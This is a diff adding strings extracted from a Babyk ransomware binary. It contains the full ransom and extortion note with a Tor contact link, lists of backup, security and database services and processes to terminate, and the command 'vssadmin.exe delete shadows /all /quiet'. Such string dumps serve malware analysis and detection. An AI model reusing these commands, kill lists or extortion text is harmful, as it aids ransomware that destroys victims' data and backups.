@@ -1,0 +1,265 @@
+!This program cannot be run in DOS mode.
+`.data
+.idata
+@.reloc
+memtas
+mepocs
+sophos
+backup
+GxCIMgr
+DefWatch
+ccEvtMgr
+ccSetMgr
+SavRoam
+RTVscan
+QBFCService
+QBIDPService
+Intuit.QuickBooks.FCS
+QBCFMonitorService
+YooBackup
+zhudongfangyu
+sophos
+stc_raw_agent
+VSNAPVSS
+VeeamTransportSvc
+VeeamDeploymentService
+VeeamNFSSvc
+PDVFSService
+BackupExecVSSProvider
+BackupExecAgentAccelerator
+BackupExecAgentBrowser
+BackupExecDiveciMediaService
+BackupExecJobEngine
+BackupExecManagementService
+BackupExecRPCService
+AcrSch2Svc
+AcronisAgent
+CASAD2DWebSvc
+CAARCUpdateSvc
+IsWow64Process
+kernel32.dll
+kernel32.dll
+Wow64DisableWow64FsRedirection
+kernel32.dll
+Wow64RevertWow64FsRedirection
+, Error Code: 
+Can't OpenProcess
+############## [ babyk ransomware ] ############## 
+* What happend? 
+---------------------------------------------- 
+Your computers and servers are encrypted, backups are deleted from your network and copied. 
+We use strong encryption algorithms, so you cannot decrypt your data without us. 
+But you can restore everything by purchasing a special program from us - a universal decoder. 
+This program will restore your entire network. Follow our instructions below and you will recover all your data. 
+If you continue to ignore this for a long time, we will start reporting the hack to mainstream media and posting 
+your data to the dark web. 
+* What guarantees? 
+---------------------------------------------- 
+We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests. 
+All our decryption software is perfectly tested and will decrypt your data. We will also provide support in case of problems. 
+We guarantee to decrypt one file for free. Go to the site and contact us. 
+* How to contact us? 
+---------------------------------------------- 
+1) Download for browser: https://www.torproject.org/download/ 
+2) Open it 
+3) Follow this link in tor browser: http://babukq4e2p4wu4iq.onion/login.php?id=qrkurJuYkvPsMF4sX5avnaBrUHldGe
+Can't RmGetList
+Can't RmRegisterResources
+Can't RmStartSession
+Can't open file after killHolder
+Can't MoveFileExW
+Can't FindFirstFileW
+Can't FindFirstFileW
+DoYouWantToHaveSexWithCuongDong
+DoYouWantToHaveSexWithCuongDong
+AQLwH'
+.rdata
+.rdata$zzzdbg
+.text$di
+.text$mn
+.idata$5
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.CRT$XCU
+FindFirstVolumeW
+FindNextVolumeW
+FindVolumeClose
+GetDriveTypeW
+GetVolumePathNamesForVolumeNameW
+CloseHandle
+GetLastError
+GetCurrentProcess
+TerminateProcess
+OpenProcess
+GetTickCount
+GetModuleHandleA
+GetProcAddress
+LoadLibraryA
+lstrcmpW
+lstrlenW
+SetVolumeMountPointW
+CreateToolhelp32Snapshot
+Process32FirstW
+Process32NextW
+CreateFileW
+WriteFile
+InitializeCriticalSection
+EnterCriticalSection
+LeaveCriticalSection
+DeleteCriticalSection
+lstrlenA
+GetCommandLineW
+FindClose
+FindFirstFileW
+FindNextFileW
+GetFileSizeEx
+GetLogicalDrives
+ReadFile
+SetFileAttributesW
+SetFilePointerEx
+WaitForSingleObject
+CreateMutexA
+WaitForMultipleObjects
+GetCurrentProcessId
+ExitProcess
+CreateThread
+ExitThread
+SetProcessShutdownParameters
+GetSystemInfo
+lstrcmpiW
+lstrcpyW
+lstrcatW
+OpenMutexA
+MoveFileExW
+WideCharToMultiByte
+HeapAlloc
+HeapFree
+GetProcessHeap
+ReleaseSemaphore
+CreateSemaphoreA
+KERNEL32.dll
+wsprintfA
+USER32.dll
+CryptAcquireContextW
+CloseServiceHandle
+ControlService
+EnumDependentServicesA
+OpenSCManagerA
+OpenServiceA
+QueryServiceStatusEx
+CryptReleaseContext
+CryptGenRandom
+ADVAPI32.dll
+ShellExecuteW
+CommandLineToArgvW
+SHEmptyRecycleBinA
+SHELL32.dll
+NetShareEnum
+NetApiBufferFree
+NETAPI32.dll
+RmStartSession
+RmEndSession
+RmRegisterResources
+RmGetList
+RstrtMgr.DLL
+WNetGetConnectionW
+WNetOpenEnumW
+WNetEnumResourceW
+WNetCloseEnum
+MPR.dll
+5!5(5/565=5D5K5R5Y5`5g5n5
+656F6k6
+7&707d7}7
+9,9B9X9p9
+:":,:R:|:
+==*=1=>=D=K=[=f=m=z=
+8&8J8e8
+0)0H0]0o0
+191K1X1w1
+2$262^2p2v2
+33%3/393G3L3V3g3
+4D4U4^4o4x4
+545F5n5
+5<6A6K6\6
+7/7A7i7{7
+:(:1:>:O:T:a:t:
+<"<'<Q<c<
+=#>A>c>}>
+:G=Z=|=
+4"4D4s7
+>">_>t>
+>2?B?`?x?
+0$0*000
+0 0$0(0,0004080<0@0D0H0L0P0T0X0\0`0d0h0l0p0t0x0|0
+1 1$1(14181<1@1D1H1L1P1T1X1\1`1d1h1l1p1t1x1|1
+sql.exe
+oracle.exe
+ocssd.exe
+dbsnmp.exe
+synctime.exe
+agntsvc.exe
+isqlplussvc.exe
+xfssvccon.exe
+mydesktopservice.exe
+ocautoupds.exe
+encsvc.exe
+firefox.exe
+tbirdconfig.exe
+mydesktopqos.exe
+ocomm.exe
+dbeng50.exe
+sqbcoreservice.exe
+excel.exe
+infopath.exe
+msaccess.exe
+mspub.exe
+onenote.exe
+outlook.exe
+powerpnt.exe
+steam.exe
+thebat.exe
+thunderbird.exe
+visio.exe
+winword.exe
+wordpad.exe
+notepad.exe
+/c vssadmin.exe delete shadows /all /quiet
+cmd.exe
+AppData
+Windows
+Windows.old
+Tor Browser
+Internet Explorer
+Google
+Opera Software
+Mozilla
+Mozilla Firefox
+$Recycle.Bin
+ProgramData
+All Users
+autorun.inf
+boot.ini
+bootfont.bin
+bootsect.bak
+bootmgr
+bootmgr.efi
+bootmgfw.efi
+desktop.ini
+iconcache.db
+ntuser.dat
+ntuser.dat.log
+ntuser.ini
+thumbs.db
+Program Files
+Program Files (x86)
+#recycle
+.babyk
+\How To Restore Your Files.txt
+How To Restore Your Files.txt
+.babyk
+ADMIN$
+gdebug
+shares
+before
